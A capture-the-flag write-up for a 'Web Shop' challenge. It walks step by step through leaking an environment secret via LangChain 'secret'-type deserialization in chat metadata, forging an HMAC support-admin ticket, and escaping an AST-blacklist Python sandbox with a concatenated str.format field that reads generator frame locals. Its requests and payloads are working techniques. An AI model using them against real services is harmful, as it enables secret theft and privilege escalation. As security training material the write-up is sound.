# Web Shop Writeup

## 0. Overall Exploit Chain

```text
Register and log in
  -> Knock the wooden fish 10 times to increase coins from 50 to 60
  -> Buy the Support Debug Bundle
  -> Download support_ticket.py
  -> Learn SHOP_SUPPORT_SEED and the support ticket signing algorithm
  -> Observe chat presence metadata and confirm that the backend uses LangChain serialization/deserialization
  -> Construct LangChain metadata with type=secret
  -> Write it through /api/chat/messages and read history through /api/chat/messages to trigger loads()
  -> Leak SHOP_SUPPORT_SEED
  -> Use the seed to issue today's support ticket for the current user
  -> Call Bot /login to escalate privileges to support_admin
  -> Call /api/rules/run
  -> Use str.format field traversal to bypass the AST static blacklist
  -> Read shipment_manifest from the generator frame locals
  -> Obtain the flag
```

---

## 1. Register and Log In

Register a new account:

```http
POST /api/auth/register
Content-Type: application/json

{
  "username": "player001",
  "password": "Strong_123456",
  "confirmPassword": "Strong_123456"
}
```

The response contains a token and user information:

```json
{
  "token": "...",
  "user": {
    "id": 1,
    "username": "player001",
    "coins": 50,
    "role": "customer",
    "woodfishCount": 0
  }
}
```

Include the following header in subsequent requests:

```http
Authorization: Bearer <token>
```

---

## 2. Explore the Shop and Wooden Fish

Query the products:

```http
GET /api/shop/products
Authorization: Bearer <token>
```

You can see a product priced at 60 coins:

```text
Support Debug Bundle
```

A new user starts with 50 coins. The wooden fish endpoint can grant at most 10 extra coins:

```http
POST /api/woodfish/knock
Authorization: Bearer <token>
Content-Type: application/json

{}
```

After calling it 10 times:

```text
coins = 60
woodfishCount = 10
```

---

## 3. Buy the Support Debug Bundle and Download the Script

Buy the debug bundle priced at 60:

```http
POST /api/shop/buy
Authorization: Bearer <token>
Content-Type: application/json

{
  "productId": 2
}
```

After a successful purchase, the response contains a download path:

```json
{
  "download": "/api/shop/download/support-ticket"
}
```

Download it:

```http
GET /api/shop/download/support-ticket
Authorization: Bearer <token>
```

This gives `support_ticket.py`. The core logic is:

```python
SUPPORT_SEED_ENV = "SHOP_SUPPORT_SEED"


def issue_support_ticket(user: dict[str, Any]) -> str:
    seed = os.environ.get(SUPPORT_SEED_ENV, "local-support-seed")
    today = datetime.now(timezone.utc).strftime("%Y%m%d")
    message = f"support-login:{user['id']}:{user['username']}:{today}"
    digest = hmac.new(seed.encode(), message.encode(), hashlib.sha256).hexdigest()
    return digest[:12]


def verify_support_ticket(user: dict[str, Any], provided: str) -> bool:
    expected = issue_support_ticket(user)
    return secrets.compare_digest(provided, expected)
```

From this, we know:

1. The environment variable that needs to be leaked is:

```text
SHOP_SUPPORT_SEED
```

2. The support admin login ticket algorithm is:

```text
hmac_sha256(
  key = SHOP_SUPPORT_SEED,
  msg = "support-login:<user_id>:<username>:<UTC date YYYYMMDD>"
)[:12]
```

---

## 4. Observe the Chat Presence Packet

After entering the chat page, the frontend periodically calls:

```http
POST /api/chat/presence
Authorization: Bearer <token>
Content-Type: application/json
```

The metadata is similar to:

```json
{
  "content": "alive",
  "metadata": {
    "source": "asset-probe",
    "client": "web-shop",
    "ts": 1780000000000,
    "messages": [
      {
        "lc": 1,
        "type": "constructor",
        "id": ["langchain_core", "messages", "SystemMessage"],
        "kwargs": {
          "content": "Support replay context initialized."
        }
      }
    ]
  }
}
```

The key format is:

```json
{
  "lc": 1,
  "type": "constructor",
  "id": ["langchain_core", "messages", "SystemMessage"],
  "kwargs": {}
}
```

This is the format of a LangChain serialized object. The backend has serialization/restoration logic for chat metadata.

LangChain also supports the `secret` type:

```json
{
  "lc": 1,
  "type": "secret",
  "id": ["ENV_NAME"]
}
```

When `loads()` restores a secret, it attempts to read the value from environment variables.

---

## 5. Leak SHOP_SUPPORT_SEED

Normal chat messages store metadata in the database. When chat history is read, the backend restores historical metadata.

Construct a message containing a `secret`:

```http
POST /api/chat/messages
Authorization: Bearer <token>
Content-Type: application/json

{
  "content": "hello",
  "metadata": {
    "client": "web",
    "probe": {
      "lc": 1,
      "type": "secret",
      "id": ["SHOP_SUPPORT_SEED"]
    }
  }
}
```

Then read historical messages:

```http
GET /api/chat/messages
Authorization: Bearer <token>
```

In the response, the current user's own message will include the restored metadata:

```json
{
  "messages": [
    {
      "username": "player001",
      "content": "hello",
      "metadata": {
        "client": "web",
        "probe": "<leaked SHOP_SUPPORT_SEED>"
      }
    }
  ]
}
```

Record:

```text
SHOP_SUPPORT_SEED = <leaked seed>
```

In the public environment, the chat history query only returns:

```text
System preset messages with user_id = 0
The current user's own messages
```

Therefore, you cannot directly see other players' payloads or leaked values.

---

## 6. Issue a Support Admin Login Ticket

According to the algorithm in `support_ticket.py`, issue today's ticket for the current user:

```python
import hashlib
import hmac
from datetime import datetime, timezone

seed = "<leaked SHOP_SUPPORT_SEED>"
user_id = 1
username = "player001"

today = datetime.now(timezone.utc).strftime("%Y%m%d")
message = f"support-login:{user_id}:{username}:{today}"
ticket = hmac.new(seed.encode(), message.encode(), hashlib.sha256).hexdigest()[:12]
print(ticket)
```

Note that the date here uses the UTC date, not the local timezone date.

---

## 7. Log In as support_admin Through the Bot

Send the following to the Bot:

```http
POST /api/bot/chat
Authorization: Bearer <token>
Content-Type: application/json

{
  "message": "/login <ticket>"
}
```

After success, the user's role in the response becomes:

```text
support_admin
```

You can also confirm it with:

```http
GET /api/auth/me
Authorization: Bearer <token>
```

Confirmation:

```json
{
  "user": {
    "role": "support_admin"
  }
}
```

---

## 8. Enter Rule Lab

After privilege escalation, you can call:

```http
POST /api/rules/run
Authorization: Bearer <token>
Content-Type: application/json

{
  "code": "result = 1 + 1"
}
```

Normal response:

```json
{
  "ok": true,
  "result": 2,
  "elapsedMs": 0
}
```

---

## 9. Rule Lab Sandbox Analysis

Rule Lab exposes a business function:

```python
iter_preview_items()
```

Normal usage:

```python
items = []
for item in iter_preview_items():
    items.append(item)
result = items
```

The sandbox forbids many direct escape techniques, for example:

```python
import os
open("/app/private/flag.txt").read()
```

It also forbids directly accessing the generator frame:

```python
g = iter_preview_items()
next(g)
result = g.gi_frame.f_locals
```

This will be rejected:

```text
forbidden attribute: gi_frame
forbidden attribute: f_locals
```

The core sandbox logic contains a generator that is roughly equivalent to:

```python
def iter_preview_items():
    shipment_manifest = load_manifest()
    for item in preview_items:
        yield item
```

Here:

```python
shipment_manifest
```

is the content of the private shipping preview file. In the deployment environment, this file is the flag.

The sandbox uses an AST blacklist to detect sensitive fragments in attribute names and string constants:

```text
gi_frame
f_locals
f_globals
...
```

However, Python's `str.format()` field name performs attribute access and item access during formatting. The field string can be produced through string concatenation, thereby bypassing the AST static detection of the complete sensitive string.

---

## 10. Sandbox Escape Payload

Submit the code:

```python
g = iter_preview_items()
next(g)
field = "{0.gi_" + "frame.f_" + "locals[shipment_manifest]}"
result = field.format(g)
```

Corresponding request:

```http
POST /api/rules/run
Authorization: Bearer <token>
Content-Type: application/json

{
  "code": "g = iter_preview_items()\nnext(g)\nfield = \"{0.gi_\" + \"frame.f_\" + \"locals[shipment_manifest]}\"\nresult = field.format(g)"
}
```

Principle:

1. `g = iter_preview_items()` creates the generator.
2. `next(g)` runs the generator until the first `yield`; at this point, `shipment_manifest` already exists in the generator frame locals.
3. You cannot directly write `g.gi_frame.f_locals`, because the AST checks the attribute names and rejects them.
4. Construct the format field:

```python
"{0.gi_" + "frame.f_" + "locals[shipment_manifest]}"
```

After concatenation, it becomes:

```python
"{0.gi_frame.f_locals[shipment_manifest]}"
```

5. `field.format(g)` executes the following during format field parsing:

```python
g.gi_frame.f_locals["shipment_manifest"]
```

6. This retrieves the flag content.

Successful response:

```json
{
  "ok": true,
  "result": "SCTF{...}",
  "elapsedMs": 0
}
```
